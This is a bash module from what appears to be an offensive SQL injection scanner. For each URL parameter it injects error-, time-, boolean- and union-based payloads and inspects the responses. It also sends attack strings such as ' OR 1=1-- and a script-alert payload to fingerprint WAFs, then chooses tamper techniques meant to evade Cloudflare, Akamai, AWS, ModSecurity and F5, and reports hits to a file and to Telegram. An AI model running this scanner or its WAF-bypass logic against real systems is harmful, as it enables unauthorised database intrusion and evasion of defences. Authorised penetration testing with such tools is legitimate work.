#!/bin/bash
# SQLInjectionScanner Detection Module - SQL injection detection functions
# This file contains the core detection logic for SQL injection vulnerabilities

# Source the core module
# shellcheck source=sqli_core.sh
. "./sqli_core.sh"

# ---------------------------- Detection Functions ----------------------------

# Patterns to grep for in response indicating SQL errors (case-insensitive)
ERROR_PATTERNS='SQL syntax|SQL error|SQLSTATE|MySQL|MariaDB|PostgreSQL|ORA-|ODBC|SQLite|syntax error|unclosed quotation|quoted string|not properly terminated'

# Test a single URL for SQL injection vulnerabilities
test_url_for_sqli() {
  local url="$1"
  local tamper_techniques="$2"
  local payload_types=("Error_Based" "Time_Based" "Boolean_Based" "Union_Based")
  local vulnerable=false
  
  # Skip URLs without parameters
  if [[ ! "$url" =~ \? ]]; then
    log "VERBOSE" "Skipping URL without parameters: $url"
    return 1
  fi
  
  # Separate base URL and query string
  base="${url%%\?*}"        # everything before '?'
  query="${url#*\?}"        # everything after '?' (the query params)
  
  if [[ -z "$query" ]]; then
    log "VERBOSE" "Empty query string in URL: $url"
    return 1
  fi
  
  # Split query into individual params (param=value pairs)
  IFS='&' read -r -a params <<< "$query"
  
  for param_pair in "${params[@]}"; do
    # param_pair like "id=1" or "search=query"
    param_name="${param_pair%%=*}"
    orig_value="${param_pair#*=}"
    [[ -z "$param_name" ]] && continue
    
    log "VERBOSE" "Testing parameter '$param_name' in URL: $url"
    
    # Test each type of payload
    for type in "${payload_types[@]}"; do
      log "VERBOSE" "Testing $type payloads for parameter '$param_name'"
      
      # Get payloads of this type
      while IFS= read -r payload; do
        [[ -z "$payload" ]] && continue
        
        # Apply tamper techniques to payload
        if [[ -n "$tamper_techniques" ]]; then
          tampered_payload=$(apply_tamper "$payload" "$tamper_techniques")
        else
          tampered_payload="$payload"
        fi
        
        # Apply encoding based on encoding level
        encoded_payload=$(encode_payload "$tampered_payload")
        
        if $VERBOSE; then
          log "VERBOSE" "Testing payload: $encoded_payload"
        fi
        
        # Construct the injected URL by replacing this param's value with payload
        injected_url="${base}?$( sed -E "s/([?&]${param_name}=)[^&]*/\1${encoded_payload}/" <<< "${url}" )"
        
        # Prepare curl command
        curl_cmd=$(prepare_curl_cmd "$injected_url")
        
        # Execute curl command to test the payload
        response=$(eval "$curl_cmd")
        
        # Separate HTTP code from response body
        http_code="${response##*HTTP_CODE:}"
        response_body="${response%HTTP_CODE:*}"
        
        # Start of detection logic based on payload type
        detected=false
        detection_details=""
        
        case "$type" in
          "Error_Based")
            # Check for HTTP 5xx errors (server-side errors)
            if [[ "$http_code" =~ ^5[0-9]{2}$ ]]; then
              detected=true
              detection_details="HTTP $http_code error"
            # Check for SQL error patterns in response
            elif echo "$response_body" | grep -Eiq "$ERROR_PATTERNS"; then
              detected=true
              detection_details="Error: $(echo "$response_body" | grep -Eio "$ERROR_PATTERNS" | head -1)"
            fi
            ;;
            
          "Time_Based")
            # Measure response time for time-based detection
            start_time=$(date +%s.%N)
            eval "$(prepare_curl_cmd "$injected_url") >/dev/null 2>&1"
            end_time=$(date +%s.%N)
            elapsed=$(echo "$end_time - $start_time" | bc)
            
            # Check if response is delayed (5 seconds is a common sleep time in the payloads)
            if (( $(echo "$elapsed >= 4.5" | bc -l) )); then
              detected=true
              detection_details="Time-delay ${elapsed}s"
            fi
            ;;
            
          "Boolean_Based")
            # For boolean-based, we test pairs of TRUE/FALSE conditions
            # We need to use a different approach based on URL patterns
            if [[ "$payload" == *"1=1"* ]]; then
              # Store the TRUE response
              true_response="$response_body"
              
              # Create and test the FALSE condition (e.g., "1=2" instead of "1=1")
              false_payload=$(echo "$payload" | sed 's/1=1/1=2/g')
              false_payload=$(apply_tamper "$false_payload" "$tamper_techniques")
              false_payload=$(encode_payload "$false_payload")
              
              injected_url_false="${base}?$( sed -E "s/([?&]${param_name}=)[^&]*/\1${false_payload}/" <<< "${url}" )"
              false_response=$(eval "$(prepare_curl_cmd "$injected_url_false")")
              false_response="${false_response%HTTP_CODE:*}"
              
              # If responses differ significantly, might be boolean-based SQLi
              if [[ "$true_response" != "$false_response" ]]; then
                diff_size=$(echo "${#true_response} - ${#false_response}" | bc)
                if (( $(echo "sqrt($diff_size^2) > 100" | bc -l) )); then
                  detected=true
                  detection_details="Boolean-based: response difference $(echo "sqrt($diff_size^2)" | bc)"
                fi
              fi
            fi
            ;;
            
          "Union_Based")
            # For UNION-based SQLi, look for evidence of the UNION working
            # We look for patterns like "1,2,3" (numbers) or NULL in the response
            if [[ "$payload" == *"UNION SELECT"* ]] && [[ "$response_body" =~ ([0-9]+,[0-9]+|[0-9]+ [0-9]+|NULL,NULL) ]]; then
              detected=true
              detection_details="Union-based: $(echo "$response_body" | grep -Eo "([0-9]+,[0-9]+|NULL,NULL)" | head -1)"
            fi
            ;;
        esac
        
        # If vulnerability detected
        if $detected; then
          log "SUCCESS" "$type SQLi found at ${url} (param ${param_name}): ${detection_details}"
          send_telegram "🔴 SQLi detected! ${url} (parameter '${param_name}'): ${detection_details}"
          echo "${url} [$param_name] - $type: ${detection_details}" >> "${OUTPUT_DIR}/vulnerabilities.txt"
          return 0
        fi
        
      done < <(load_payloads "$type")
      
    done  # End of payload type loop
  done  # End of param loop
  
  return 1  # No vulnerability found
}

# Detect WAF presence and determine bypass techniques
detect_waf() {
  local url="$1"
  
  # Common WAF detection payloads
  local waf_detection_payloads=(
    "' OR 1=1--"
    "1 AND 1=1 UNION SELECT 1,2,3--"
    "1' OR '1'='1"
    "<script>alert(1)</script>"
  )
  
  log "INFO" "Detecting WAF presence on $url..."
  
  # WAF fingerprints (response patterns that identify specific WAFs)
  local waf_signatures=(
    "cloudflare|cloudflare-nginx" # Cloudflare
    "incapsula" # Imperva/Incapsula
    "akamai" # Akamai
    "aws|waf|amazon" # AWS WAF
    "wordfence" # Wordfence
    "sucuri" # Sucuri
    "mod_security|modsecurity" # ModSecurity
    "fortinet|fortigate" # Fortinet
    "barracuda" # Barracuda
    "comodo" # Comodo
    "f5|big-?ip" # F5 BIG-IP
    "firewall" # Generic
  )
  
  # Test with basic payloads to detect WAF
  waf_detected=false
  waf_type="Unknown"
  
  for payload in "${waf_detection_payloads[@]}"; do
    # Create test URL
    test_url="${url}?id=${payload}"
    
    # Get response
    response=$(curl -s -L -o /dev/null -w "%{http_code}|%{size_download}" --max-time 10 "$test_url")
    http_code=$(echo "$response" | cut -d'|' -f1)
    
    # Check for WAF response codes (typically 403, 406, 429)
    if [[ "$http_code" == "403" || "$http_code" == "406" || "$http_code" == "429" ]]; then
      waf_detected=true
      
      # Try to identify WAF type
      full_response=$(curl -s -L "$test_url")
      
      for sig in "${waf_signatures[@]}"; do
        if echo "$full_response" | grep -Eiq "$sig"; then
          waf_type=$(echo "$sig" | cut -d'|' -f1 | tr '[:lower:]' '[:upper:]')
          break
        fi
      done
      
      log "INFO" "WAF detected: $waf_type"
      break
    fi
  done
  
  if ! $waf_detected; then
    log "INFO" "No WAF detected on target."
    # Return empty string to indicate no WAF
    echo ""
    return
  fi
  
  # Select appropriate tamper techniques based on WAF type
  case "$(echo "$waf_type" | tr '[:upper:]' '[:lower:]')" in
    cloudflare*)
      echo "space2comment,charencode,randomcase"
      ;;
    akamai*)
      echo "space2randomblank,charunicodeencode,between"
      ;;
    aws*|amazon*)
      echo "space2dash,charunicodeencode,equaltolike"
      ;;
    mod_security*|modsecurity*)
      echo "modsecurityversioned,space2comment,space2hash"
      ;;
    f5*|big*ip*)
      echo "space2morehash,randomcase,charencode"
      ;;
    *)
      # Default techniques that often work against various WAFs
      echo "space2comment,between,percentage,randomcase"
      ;;
  esac
}

# Export detection functions
export -f test_url_for_sqli
export -f detect_waf 